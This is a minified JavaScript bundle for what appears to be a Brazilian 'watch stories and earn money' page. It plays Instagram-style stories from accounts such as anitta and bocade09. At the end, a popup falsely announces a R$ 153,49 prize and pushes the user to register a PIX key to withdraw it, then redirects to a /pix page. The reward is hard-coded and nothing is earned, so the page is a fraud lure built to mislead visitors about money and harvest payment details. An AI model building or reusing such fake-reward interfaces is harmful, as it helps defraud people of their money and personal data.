import{S as l}from"./StoriesPool-twRME4vp.js";const t=function(s){let e=new Date/1e3;return s&&(e-=s*60),e},a=new l,c={id:"anitta",photo:"/assets/igs/anitta/img.webp",name:"anitta",gain:35.65,time:t(),items:[{id:"anitta-1",type:"video",length:5,src:"/assets/igs/anitta/2.mp4",linkText:!1,time:t(15)},{id:"anitta-2",type:"photo",length:3,src:"/assets/igs/anitta/3.jpeg",linkText:!1,time:t(2*60)},{id:"anitta-3",type:"photo",length:3,src:"/assets/igs/anitta/4.jpeg",linkText:!1,time:t(7*60)}]},b={id:"bob",photo:"/assets/igs/bob/avatar.jpg",name:"bob",gain:29.52,time:t(),items:[{id:"bob-1",type:"video",length:0,src:"/assets/igs/bob/bob1.mp4",linkText:!1,time:t(15)},{id:"bob-2",type:"video",length:0,src:"/assets/igs/bob/bob2.mp4",linkText:!1,time:t(15)},{id:"bob-3",type:"video",length:0,src:"/assets/igs/bob/bob3.mp4",linkText:!1,time:t(15)}]},d={id:"bocade09",photo:"/assets/igs/bocade09/avatar.jpg",name:"bocade09",gain:38.32,time:t(),items:[{id:"boca-1",type:"video",length:0,src:"/assets/igs/bocade09/boca1.mp4",link:"",linkText:!1,time:t(22)},{id:"boca-2",type:"video",length:0,src:"/assets/igs/bocade09/boca2.mp4",link:"",linkText:!1,time:t(24)},{id:"boca-3",type:"video",length:0,src:"/assets/igs/bocade09/boca3.mp4",link:"",linkText:!1,time:t(25)},{id:"boca-4",type:"video",length:0,src:"/assets/igs/bocade09/boca4.mp4",link:"",linkText:!1,time:t(25)},{id:"boca-5",type:"photo",length:3,src:"/assets/igs/bocade09/boca5.jpg",link:"",linkText:!1,time:t(25)},{id:"boca-6",type:"video",length:0,src:"/assets/igs/bocade09/boca6.mp4",link:"",linkText:!1,time:t(25)},{id:"boca-7",type:"photo",length:3,src:"/assets/igs/bocade09/boca7.jpg",link:"",linkText:!1,time:t(25)}]};a.addStory(c);a.addStory(b);a.addStory(d);a.setOnEnd(function(){Swal.fire({heightAuto:!1,background:"white",html:`<div class="flex text-center w-full flex-col items-center justify-center gap-3">
        <p class="text-primary font-bold text-2xl leading-[1] mb-2">PARABÉNS!</p>
        <p class="text-black text-lg font-bold">Você acaba de ganhar <span class="text-4xl font-bold font-display text-green-700">R$&nbsp;153,49!</span></p>
        <p class="text-black/80">Agora, cadastre a sua chave 
        <span class="font-bold text-black">PIX</span> e realizar o seu primeiro 
        <span class="font-bold text-black">SAQUE.</span></p>
            `,confirmButtonText:`
        CADASTRAR CHAVE
    `,buttonsStyling:!1,customClass:{confirmButton:"bg-primary font-display rounded-lg w-full px-4 py-3 font-bold text-white z-[2] disabled:opacity-50 transition-all btn-breathe"},allowOutsideClick:!1,iconColor:"#198754"}).then(()=>{let s=window.location.href,e=new URL(s),i=e.pathname,o=e.search;i.endsWith("/")||(i+="/");let n=i+"pix";o&&(n+=o),Livewire.navigate(n)})});function p(){a.next()}$(".next").on("click",p);
